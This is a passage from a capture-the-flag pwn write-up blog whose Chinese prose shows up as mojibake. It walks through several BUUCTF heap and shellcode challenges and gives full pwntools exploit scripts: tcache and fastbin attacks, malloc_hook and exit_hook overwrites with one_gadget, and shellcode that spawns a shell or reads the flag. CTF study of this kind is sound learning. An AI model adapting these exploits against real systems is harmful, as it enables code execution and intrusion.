(A == execve) goto 0011 0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010 0006: 0x20 0x00 0x00 0x00000024  A = count &gt;&gt; 32 # write(fd, buf, count) 0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010 0008: 0x20 0x00 0x00 0x00000020  A = count # write(fd, buf, count) 0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0011: 0x06 0x00 0x00 0x00000000  return KILL&#39;&#39;&#39;def add(size):    sla(&#39;ice&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))def show(idx):    sla(&#39;ice&#39;,&#39;2&#39;)    sla(&#39;id&#39;,str(idx))def edit(idx,data):    sla(&#39;ice&#39;,&#39;3&#39;)    sla(&#39;id&#39;,str(idx))    sa(&#39;tent&#39;,str(data))def free(idx):    sla(&#39;ice&#39;,&#39;4&#39;)    sla(&#39;id&#39;,str(idx))add(0x100) #0free(0)free(0)show(0)ru(&#39;content: &#39;)heap_base = uu64(r(6)) - 0x260info_addr(&#39;heap_base&#39;,heap_base)add(0x100) #1edit(1,p64(heap_base+0x10))add(0x100) #2add(0x100) #3debug()data = p64(8) + &#39;\x07&#39;*8edit(3,data)add(0x80)#4free(0)show(0)ru(&#39;content: &#39;)libc_base = uu64(r(6)) - 0x3ebca0info_addr(&#39;libc_base&#39;,libc_base)data = p64(8) + &#39;\x07&#39;*8 + &#39;\x00&#39; * (0xc0 - 0x20) + p64(0x3ebc30 + libc_base) +p64(0x66660000) edit(3,data)add(0x100) #5orw = shellcraft.open(&#39;flag&#39;)orw += shellcraft.read(3,0x66660100,0x64)orw +=shellcraft.write(1,0x66660100,0x64)edit(5,asm(orw))add(0xf0) #6edit(6,p64(0x66660000))add(1)itr()</code></pre><h3 id="é¢˜è®°-1"><a href="#é¢˜è®°-1" class="headerlink" title="é¢˜è®°"></a>é¢˜è®°</h3><p>åœ¨å­¦ä¹ åˆ«äººçš„expæ—¶ï¼Œå‘ç°è¿˜æœ‰æ³„æ¼libcçš„å¦å¤–ä¸€ç§åŠæ³•ï¼Œè¿™ç§åŠæ³•æ³„æ¼å‡ºlibcï¼Œä¹Ÿä½¿å¾—æ•´ä¸ªexpï¼ŒåŸºæœ¬è·Ÿæˆ‘çš„ä¸å¤§ç›¸åŒã€‚</p><h4 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h4><p><strong>åœ¨tcache binçš„è¡¨å¤´ä¸­ï¼Œå…¶æ¯ä¸ªå¤§å°tcache binçš„count(0-7) æ˜¯ä¸€ä¸ªæ— ç¬¦å·ç±»å‹çš„æ•°æ®ã€‚</strong></p><p>å½“ç”¨uafæ¼æ´ï¼Œåœ¨ä¸€ä¸ªchainä¸Šä¼ªé€ ä¸€ä¸ªchunkåœ°å€ï¼Œè¿™æ ·å½“ç”³è¯·åtcache binçš„countä¼šå˜æˆ0xff&gt;0x7ï¼Œè¿™æ ·åˆ©ç”¨uafï¼Œå†æ¬¡é‡Šæ”¾è¿™ä¸ªchainä¸Š çš„chunkï¼Œå°±ä¼šè¿›å…¥åˆ°unsortbinï¼Œæ¥ç€å°±leak å‡ºlibcäº†ã€‚</p><pre><code>pwndbg&gt; parseheapaddr                prev                size                 status              fd                bk0x55daa2e85000      0x0                 0x250                Used                None              None0x55daa2e85250      0x0                 0x110                Freed     0x7fb70dbbaca0    0x7fb70dbbaca00x55daa2e85360      0x110               0x110                Freed     0x55daa2e85370              Nonepwndbg&gt; x/30gx 0x55daa2e850000x55daa2e85000: 0x0000000000000000      0x00000000000002510x55daa2e85010: 0x0000000000000000      0xff000000000000000x55daa2e85020: 0x0000000000000000      0x0000000000000000</code></pre><p>å‰©ä¸‹çš„å°±æ˜¯è¿›è¡Œtcache dupå³å¯ã€‚è¿™ä¸ªæ¯”æˆ‘é‚£ä¸ªæ–¹æ³•è¦ç®€å•çš„å¤šã€‚</p><h4 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h4><p><a href="https://blog.csdn.net/github_36788573/article/details/103475238" target="_blank" rel="noopener">https://blog.csdn.net/github_36788573/article/details/103475238</a></p><p><a href="https://blog.csdn.net/seaaseesa/article/details/103450524" target="_blank" rel="noopener">https://blog.csdn.net/seaaseesa/article/details/103450524</a></p><h2 id="æŠ¤ç½‘æ¯-2018-gettingstart"><a href="#æŠ¤ç½‘æ¯-2018-gettingstart" class="headerlink" title="æŠ¤ç½‘æ¯_2018_gettingstart"></a><code>æŠ¤ç½‘æ¯_2018_gettingstart</code></h2><p>ç™½ç»™é¢˜ã€‚è€ƒæµ®ç‚¹æ•°åœ¨å†…å­˜ä¸­æ˜¯æ€ä¹ˆå­˜çš„ã€‚</p><pre><code class="python">data = &#39;1&#39; * 24 + p64(0x7fffffffffffffff) + p64(0x3FB999999999999A)s(data)itr()</code></pre><h2 id="OGeek2019-bookmanager"><a href="#OGeek2019-bookmanager" class="headerlink" title="[OGeek2019]bookmanager"></a><code>[OGeek2019]bookmanager</code></h2><h3 id="åˆ†æ-5"><a href="#åˆ†æ-5" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>å­˜åœ¨heap overflow</li><li>uaf</li><li>off by one</li></ul><p>ä¸€å †æ´ï¼Œä¼ªä»£ç çœ‹èµ·æ¥å¾ˆå¤æ‚ï¼Œä½†æ˜¯åˆ©ç”¨èµ·æ¥è¾ƒä¸ºç®€å•ã€‚</p><p>é‡ç‚¹æ¼æ´å‡½æ•°åœ¨ updataä¸Šã€‚</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python# encoding: utf-8from pwn import *import timelocal_file  = &#39;./pwn-2&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,29005)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add_chapter(name):    sla(&#39;choice&#39;,&#39;1&#39;)    sa(&#39;name&#39;,str(name))def add_section(chapter,name):    sla(&#39;choice&#39;,&#39;2&#39;)    sa(&#39;into&#39;,str(chapter))    sa(&#39;name&#39;,str(name))def add_text(section,size,data):    sla(&#39;choice&#39;,&#39;3&#39;)    sa(&#39;into&#39;,str(section))    sla(&#39;write&#39;,str(size))    sa(&#39;Text&#39;,str(data))def del_chapter(name):    sla(&#39;choice&#39;,&#39;4&#39;)    sla(&#39;name&#39;,str(name))def del_section(name):    sla(&#39;choice&#39;,&#39;5&#39;)    sla(&#39;name&#39;,str(name))def del_text(name):    sla(&#39;choice&#39;,&#39;6&#39;)    sla(&#39;name&#39;,str(name))def show():    sla(&#39;choice&#39;,&#39;7&#39;)def edit(type,name,data):    sla(&#39;choice&#39;,&#39;8&#39;)    sla(&#39;update&#39;,str(type))    sa(&#39;name&#39;,str(name))    sa(&#39;New&#39;,str(data))sla(&#39;Name&#39;,&#39;chumen77&#39; * 4)add_chapter(&#39;chumen77&#39;)add_section(&#39;chumen77&#39;,&#39;1&#39;)add_section(&#39;chumen77&#39;,&#39;2&#39;)add_section(&#39;chumen77&#39;,&#39;3&#39;)add_text(&#39;1&#39;,0x100,&#39;1&#39;*0x100)# show()add_text(&#39;2&#39;,0x100,&#39;2&#39;*0x100)del_section(&#39;1&#39;)del_section(&#39;2&#39;)show()ru(&#39;Section:&#39;)libc_base = uu64(r(6)) - 0x3c4b78info_addr(&#39;libc_base&#39;,libc_base)free_hook = 0x3c67a8 + libc_baseadd_text(&#39;3&#39;,0x100,&#39;1&#39;*0x100)edit(&#39;Section&#39;,3,&#39;3&#39; + &#39;\x00&#39; + &#39;1&#39;*(0x20-2) + &#39;\xd0&#39;)data = p64(free_hook) + p64(0x20)edit(&#39;Text&#39;,&#39;3&#39;,data)one = libc_base + rce16[2]edit(&#39;Text&#39;,&#39;3&#39;,p64(one))del_chapter(&#39;chumen77&#39;)# debug()itr()</code></pre><h3 id="é¢˜è®°-2"><a href="#é¢˜è®°-2" class="headerlink" title="é¢˜è®°"></a>é¢˜è®°</h3><ul><li><p>é¢˜æ˜¯ç®€å•é¢˜ï¼Œä½†æ˜¯ç”±äºä»£ç ä¸€å¤šï¼Œä¸”æŒ‡é’ˆçœ‹èµ·æ¥å¤æ‚ï¼Œä¸ªäººåšèµ·æ¥å°±æœ‰ç‚¹æ…¢ï¼Œå¹¶ä¸”è®©è‡ªå·±è¿æœ€ç®€å•çš„heap overflowéƒ½æ²¡æœ‰æƒ³èµ·æ¥å»åˆ©ç”¨ã€‚</p><h4 id="è§£å†³åŠæ³•"><a href="#è§£å†³åŠæ³•" class="headerlink" title="è§£å†³åŠæ³•"></a>è§£å†³åŠæ³•</h4></li><li><p>å¯¹äºæŒ‡é’ˆå¤æ‚çš„å †ä¿¡æ¯åˆ†é…ï¼Œå¯ä»¥ç›´æ¥gdbä¸Šæ‰‹è°ƒæ¥ç¡®å®šåŸºæœ¬å †ä¿¡æ¯ã€‚</p></li></ul><h2 id="de1ctf-2019-weapon"><a href="#de1ctf-2019-weapon" class="headerlink" title="de1ctf_2019_weapon"></a><code>de1ctf_2019_weapon</code></h2><h3 id="åˆ†æ-6"><a href="#åˆ†æ-6" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>uaf</li><li>æœ€å¤§åªèƒ½ç”³è¯·0x60çš„chunk</li><li>æ²¡æœ‰showå‡½æ•°</li><li>éƒ¨åˆ†inputåˆ©ç”¨scanfæ¥è·å–è¯»å…¥</li></ul><h3 id="æ”»å‡»æ€è·¯-5"><a href="#æ”»å‡»æ€è·¯-5" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>free 2ä¸ªchunkï¼Œç„¶åç”¨scanf è¯»å…¥å¤§é‡çš„å­—ç¬¦ï¼Œæ¥è·å–ä¸€ä¸ªsmallbin</li><li>åˆ©ç”¨æ®‹ç•™çš„libcåœ°å€ï¼Œfastbin attck <code>IO_stdout</code>æ¥æ³„æ¼libc</li><li>fastbin attck <code>malloc_hook</code></li></ul><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python# encoding: utf-8from pwn import *import timelocal_file  = &#39;./de1ctf_2019_weapon&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,28987)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size,data):    sla(&#39;ice&#39;,&#39;1&#39;)    sla(&#39;size of weapon:&#39;,str(size))    sla(&#39;dex&#39;,str(idx))    sa(&#39;name&#39;,str(data))def free(idx):    sla(&#39;ice&#39;,&#39;2&#39;)    sla(&#39;idx&#39;,str(idx))def edit(idx,data):    sla(&#39;ice&#39;,&#39;3&#39;)    sla(&#39;idx&#39;,str(idx))    sa(&#39;new&#39;,str(data))def leak_addr():    add(0,0x60,&#39;1&#39;)    add(1,0x60,&#39;1&#39;)    add(2,0x60,&#39;1&#39;)    add(3,0x60,&#39;1&#39;)    free(0)    free(1)    sla(&#39;ice&#39;,&#39;1&#39; * 0x1000)    add(4,0x60,p16(0xa5dd))    free(3)    free(2)    free(3)    edit(3,&#39;\x00&#39;)    add(5,0x60,&#39;1&#39;)    add(6,0x60,&#39;1&#39;)    # debug()    data = &#39;\x00&#39; * 0x33 + p64(0xfbad3c80) + p64(0) * 3 + p8(0)    add(7,0x60,data)leak = 0while True:    try:        leak_addr()        ss = io.recvuntil(chr(0x7f),timeout = 0.5)        if len(ss) == 0:            raise Exception(&#39;&#39;)        io.recv(10)        leak = uu64(r(6))        if leak == 0x7ff81b57b6a3:            raise Exception(&#39;&#39;)        break    except Exception:        io.close()        # io = process(&#39;./de1ctf_2019_weapon&#39;)        io = remote(&#39;node3.buuoj.cn&#39;,28987)        continueinfo_addr(&#39;leak&#39;,leak)libc_addr = leak - 0x3c56a3info_addr(&#39;libc_base&#39;,libc_addr)malloc_hook = 0x3c4b10 + libc_addrfree(0)free(2)free(0)edit(0,p64(malloc_hook - 0x13))add(7,0x60,&#39;1&#39;)one = rce16[3] + libc_addrdata = &#39;\x00&#39; * 3 + p64(one)add(8,0x60,data)sla(&#39;ice&#39;,&#39;1&#39;)sla(&#39;size of weapon:&#39;,&#39;10&#39;)sla(&#39;dex&#39;,&#39;9&#39;)# add(9,0x30,&#39;1&#39;)# debug()itr()</code></pre><h2 id="starctf-2019-babyshell"><a href="#starctf-2019-babyshell" class="headerlink" title="starctf_2019_babyshell"></a><code>starctf_2019_babyshell</code></h2><h3 id="åˆ†æ-7"><a href="#åˆ†æ-7" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¼šæœ‰ä¸€ä¸ªå‡½æ•°æ£€æŸ¥ä½ çš„shellcodeæ˜¯å¦æ»¡è¶³è¦æ±‚ã€‚</p><pre><code class="c"> for ( i = a1; *i; ++i )  {    for ( j = &amp;unk_400978; *j &amp;&amp; *j != *i; ++j )      ;    if ( !*j )                                  // æ£€æŸ¥shellcodeåˆæ³•çš„å‡½æ•°ï¼Œéå†shellcodeçš„æ¯ä¸ªå­—ç¬¦ï¼Œåœ¨0x400987å¤„æ‰¾æ˜¯å¦æœ‰åŒ¹é…ã€‚      return 0LL;  }  return 1LL;</code></pre><p>éœ€è¦0x400987åœ°å€å¤„çš„å­—èŠ‚ç åŒ¹é…ã€‚å€˜è‹¥å‘ç°æœ‰ä¸åŒ¹é…çš„å­—èŠ‚ï¼Œå°±ç›´æ¥checkä¸è¿‡ã€‚</p><p>å¯ä»¥ç”¨çš„æœ‰ <code>pop rdxã€pop rdiã€syscall</code></p><h4 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h4><p>æœ‰å¸ˆå‚…çš„åšæ³•ï¼Œå°±æ˜¯ç”¨è¿™3ä¸ªæ±‡ç¼–ï¼Œå¼ºè¡Œå‡‘å‡ºä¸€ä¸ªreadï¼Œç„¶åæŠŠshellcodeå†æ¬¡è¯»åˆ°mmapçš„bufä¸Šåˆé€‚çš„ä½ç½®ï¼ˆæ­¤é¢˜åŠ 12ï¼‰ï¼Œå†æ¬¡è°ƒç”¨åˆ°shellcodeã€‚</p><p><a href="https://www.cnblogs.com/Rookle/p/12895895.html" target="_blank" rel="noopener">https://www.cnblogs.com/Rookle/p/12895895.html</a><br><a href="https://github.com/sixstars/starctf2019/tree/master/pwn-shellcode" target="_blank" rel="noopener">https://github.com/sixstars/starctf2019/tree/master/pwn-shellcode</a><br><a href="https://blog.csdn.net/seaaseesa/article/details/105863820" target="_blank" rel="noopener">https://blog.csdn.net/seaaseesa/article/details/105863820</a></p><pre><code>å¯¹äºä¸€äº›å—é™çš„shellcodeï¼Œæˆ‘ä»¬æœ€å¥½çš„åŠæ³•æ˜¯æ„é€ readç³»ç»Ÿè°ƒç”¨ã€‚</code></pre><h4 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h4><p>è¿˜æœ‰å°±æ˜¯è¿™ä¸ªå¾ªç¯ï¼Œå…¶å®ç›´æ¥å¯ä»¥ç”¨<code>\x00</code>æˆªæ–­ï¼Œå› ä¸ºå¼€å¤´å¾ªç¯æ¡ä»¶2 ç»™0 ç›´æ¥å°±ä¸æ‰§è¡Œä¸‹é¢çš„æ£€æµ‹å¾ªç¯ï¼Œreturn 1 èµ°äº†ã€‚</p><p><strong>ä½†æ˜¯è·³è¿‡å»éœ€è¦ï¼Œæå‰å†å¸ƒç½®å‡ ä¸ªæœºå™¨ç å­—èŠ‚ä¿è¯ä¸å½±å“ä¸‹é¢çš„shellcodeã€‚</strong></p><p>å¯ä»¥ç›´æ¥åœ¨idaé‡Œé¢è®¾ç½®æ˜¾ç¤ºæœºå™¨ç ï¼Œä»¥åç›´æ¥é€‰å–åˆé€‚çš„æœºå™¨ç æ•´ä¸Šå»å°±å¯ä»¥äº†ã€‚</p><pre><code>00 5A 5A                    add     [rdx+5Ah], bl   </code></pre><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">shellcode = asm(shellcraft.sh())s(&#39;\x00&#39;+ &#39;\x5a&#39; +&#39;\x00&#39;+ shellcode)</code></pre><h3 id="é¢˜è®°-3"><a href="#é¢˜è®°-3" class="headerlink" title="é¢˜è®°"></a>é¢˜è®°</h3><p>æ„Ÿè§‰ä¸ªäººshellcodeèƒ½åŠ›è¾ƒå·®ï¼Œå¾—æŠ½æ—¶é—´å­¦ä¹ ä¸‹ã€‚</p><h2 id="hfctf-2020-marksman"><a href="#hfctf-2020-marksman" class="headerlink" title="hfctf_2020_marksman"></a><code>hfctf_2020_marksman</code></h2><h3 id="åˆ†æ-8"><a href="#åˆ†æ-8" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¸Šæ¥ç»™äº†libcåœ°å€ï¼Œå¯ä»¥ä»»æ„åœ°å€3ä¸ªå­—èŠ‚çš„å†™å…¥ã€‚</p><h4 id="éš¾ç‚¹1"><a href="#éš¾ç‚¹1" class="headerlink" title="éš¾ç‚¹1"></a>éš¾ç‚¹1</h4><p>ä¿®æ”¹é‚£é‡Œçš„åœ°å€ï¼Œæ‰èƒ½æ§åˆ¶ç¨‹åºæµç¨‹ã€‚</p><p>å¯ä»¥ä¿®æ”¹<code>exit_hook</code>:<br><a href="https://blog.csdn.net/qq_43116977/article/details/105485947" target="_blank" rel="noopener">https://blog.csdn.net/qq_43116977/article/details/105485947</a><br>å‚è€ƒè¿™é‡Œã€‚</p><p>åœ¨é€€å‡ºæ—¶ï¼š</p><p><code>exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive</code></p><p>ä¿®æ”¹<code>__rtld_lock_unlock_recursive</code>æˆ–è€…<code>__rtld_lock_lock_recursive</code>å³å¯ã€‚</p><p><strong>gdb å¿«é€Ÿè·å–è¿™ä¸ªåœ°å€çš„åŠæ³•ï¼š</strong></p><pre><code>pwndbg&gt; p &amp;_rtld_global._dl_rtld_lock_recursive</code></pre><h4 id="éš¾ç‚¹2"><a href="#éš¾ç‚¹2" class="headerlink" title="éš¾ç‚¹2"></a>éš¾ç‚¹2</h4><p>one gadgetçš„è°ƒæ•´ã€‚</p><p>å…¶ä¸­ <code>one_gadget -lx</code>  è¿™ä¸ªå¯ä»¥è®¾ç½®æ‰«æç­‰çº§è·å–æ›´å¤šçš„one gadgetã€‚</p><p>å¹¶ä¸”åœ¨ç¨‹åºä¸­ï¼š</p><pre><code class="c">signed __int64 __fastcall sub_BC2(_BYTE *a1){  if ( (*a1 != 0xC5u || a1[1] != 0xF2u) &amp;&amp; (*a1 != 0x22 || a1[1] != 0xF3u) &amp;&amp; *a1 != 0x8Cu &amp;&amp; a1[1] != 0xA3u )    return 1LL;  puts(&quot;You always want a Gold Finger!&quot;);  return 0LL;}</code></pre><p>å¯¹å†™å…¥çš„åœ°å€ä¹Ÿç»™é™åˆ¶äº†ä¸èƒ½å‡ºç°è¿™å‡ ä¸ªå­—èŠ‚ã€‚<br>å…¶ä¸­å°±è®©å¾ˆå¥½çš„:</p><pre><code>0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:  [rsp+0x70] == NULL</code></pre><p>ä¸è®©å†™å…¥ä½¿ç”¨äº†ã€‚å…¶ä»–çš„å› ä¸ºåœ°å€å°ï¼Œçˆ†ç ´å·®è·å¤§ï¼Œæˆ–è€…é™åˆ¶æ¡ä»¶é«˜ï¼Œä¸é€‚åˆä½¿ç”¨ã€‚</p><p>æƒ³åŠæ³•è°ƒæ•´ä¸€ä¸‹ï¼Œæ¥å®ç°ä¸Šé¢è¿™ä¸ªone gadgetçš„ä½¿ç”¨ã€‚</p><p><a href="http://taqini.space/2020/04/29/about-execve/#One-gadget-%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6%E5%89%96%E6%9E%90" target="_blank" rel="noopener">http://taqini.space/2020/04/29/about-execve/#One-gadget-%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6%E5%89%96%E6%9E%90</a></p><p>å‚è€ƒ taqiniå¸ˆå‚…çš„è¿™ä¸ªæ–‡ç« ï¼Œå‘ç°å…¶ä¸­å°±æœ‰å¯¹è¿™ä¸ªçš„åˆ†æï¼Œå‘ç°æœ€é‡è¦çš„å°±æ˜¯ï¼š<br><code>rsi rdi rdx</code>è¦ç»™æ§åˆ¶å¥½ï¼Œå…¶ä¸­è¿™ä¸ªgadgeté™„è¿‘çš„æ±‡ç¼–å¦‚å›¾æ‰€ç¤º</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/uQchWa.png" srcset="/img/loading.gif" alt></p><p>å…¶ä¸­8cç»“å°¾çš„æ±‡ç¼–ä¹‹åæ˜¯ä¸€å®šè¦æ‰§è¡Œçš„ï¼Œå…¶ä¸­å°±æ§åˆ¶äº†<code>rsi rdi rdx</code>ã€‚å¹¶ä¸”8cè¿™æ¡æ±‡ç¼–ä¹Ÿæ˜¯ä¸å¯ä»¥è·³è¿‡ï¼Œæ§åˆ¶çš„raxï¼Œåœ¨è¿™ä¸ªone gadget ä¸­æ˜¯å¾ˆæœ‰ç”¨çš„ï¼Œå¦åˆ™å½“åˆä½œè€…åœ¨å†™è¿™ä¸ªone gadgetæ€ä¹ˆæ²¡æœ‰è·³è¿‡ï¼Œç›´æ¥ä»93ç»“å°¾æ±‡ç¼–å¼€å§‹äº†ã€‚</p><p>å‘ä¸Šçœ‹æœ‰ä¸ªcallæŒ‡ä»¤ï¼Œè¿™æ˜¯å¯¹æ¥ä¸‹æ¥çš„one gadgetæ‰§è¡Œå¹¶æ— é€ æˆé‡è¦å‚æ•°å¤§çš„å½±å“çš„ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•å‘ä¸Šå†™ä¸€ä¸ªåœ°å€ï¼Œè®©è¿™ä¸ªgadgetä»<code>0x10a387</code>å¼€å§‹ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/hDqu69.png" srcset="/img/loading.gif" alt><br>æ‰§è¡Œä¸‹å»å‘ç°æ˜¯å¯ä»¥æ»¡è¶³<code>execve(&quot;/bin/sh&quot;, 0, environ)</code>çš„ã€‚</p><p>æ­¤é¢˜ä¸­å¯¹äºexit hook çš„æ”¹å†™ä¸­ï¼Œ<code>_dl_rtld_lock_recursive</code> å¯ä»¥å®Œæˆæ¡ä»¶çš„æ»¡è¶³ã€‚<code>_dl_rtld_unlock_recursive</code>ä¸å¯ä»¥ã€‚<br>å…·ä½“è·Ÿè¿‡å»ä¼šå‘ç°æ˜¯åœ¨ç¬¬2å’Œå‚æ•°å‡ºäº†é—®é¢˜ï¼Œä¸”åœ¨one gadgetä¸­ç¬¬äºŒä¸ªå‚æ•°çš„æ§åˆ¶å¾ˆç„å­¦ï¼Œä¸”å¾ˆéš¾æ§åˆ¶ï¼Œè®©äººå¤´å¤§ã€‚</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">ru(&#39;0x&#39;)libc_base = int(r(12),16) - libc.sym[&#39;puts&#39;]info_addr(&#39;libc_base&#39;,libc_base)exit_hook = 0x81df60 + libc_baseone = 0x10a387 + libc_base# debug()sl(str(exit_hook))sla(&#39;biang&#39;,chr((one  &amp;0xff)))sla(&#39;biang!&#39;,chr((one &gt;&gt; 8 &amp;0xff)))sla(&#39;biang!&#39;,chr((one &gt;&gt; 16 &amp;0xff)))itr()</code></pre><h3 id="é¢˜è®°-4"><a href="#é¢˜è®°-4" class="headerlink" title="é¢˜è®°"></a>é¢˜è®°</h3><p>å¯¹äºä¿®æ”¹<code>_dl_fini</code>ï¼Œåˆå‘ç°äº†ä¸€ä¸ªå¾ˆå¥½çš„å‚è€ƒé“¾æ¥ï¼š<br><a href="https://bbs.pediy.com/thread-248495.htm#msg_header_h2_1" target="_blank" rel="noopener">https://bbs.pediy.com/thread-248495.htm#msg_header_h2_1</a></p><h2 id="sctf-2019-easy-heap"><a href="#sctf-2019-easy-heap" class="headerlink" title="sctf_2019_easy_heap"></a><code>sctf_2019_easy_heap</code></h2><h3 id="åˆ†æ-9"><a href="#åˆ†æ-9" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>å¼€å¤´mmap ä¸€æ®µå†…å­˜ rwx</li><li>libc 2.27çš„off by null</li><li>æ²¡æœ‰show</li></ul><h3 id="æ”»å‡»æ€è·¯-6"><a href="#æ”»å‡»æ€è·¯-6" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>å…ˆä¸Šæ¥ç”³è¯·ä¸€ä¸ª0x1000çš„å†…å­˜å—ï¼Œç„¶åé‡Šæ”¾ï¼Œå¯ä»¥ä¿è¯æ¯æ¬¡ç”³è¯·çš„å †å—ä¸Šéƒ½å­˜æœ‰libcä¿¡æ¯ï¼Œå‡†å¤‡æ”»å‡»åˆ©ç”¨</li><li>off by null ç•™å‡º 2ä¸ªé‡å çš„å †å—</li><li>ä¸€ä¸ªæ”»å‡» mmapï¼Œå¦ä¸€ä¸ªæ”»å‡»malloc hook</li></ul><p>ç”±äºtcache åŸºæœ¬æ²¡æœ‰ä»€ä¹ˆæ£€æŸ¥ï¼Œåˆ©ç”¨èµ·æ¥è¾ƒä¸ºå®¹æ˜“ã€‚</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python# encoding: utf-8from pwn import *import timelocal_file  = &#39;./sctf_2019_easy_heap&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,28382)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size):    sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)    sla(&#39;ize&#39;,str(size))def free(idx):    sla(&#39;&gt;&gt;&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))def edit(idx,data):    sla(&#39;&gt;&gt;&#39;,&#39;3&#39;)    sla(&quot;dex&quot;,str(idx))    sa(&#39;tent&#39;,str(data))ru(&#39;0x&#39;)mmap = int(r(10),16)add(0x1000)add(0x10) #1free(0)add(0x90) #0add(0x28) #2add(0x18) #3add(0xf0) #4for i in range(7):    add(0x90)for i in range(7):    free(i+5)    add(0xf0)for i in range(7):    free(i+5)free(0)edit(3,&#39;\x00&#39; * 0x10 + 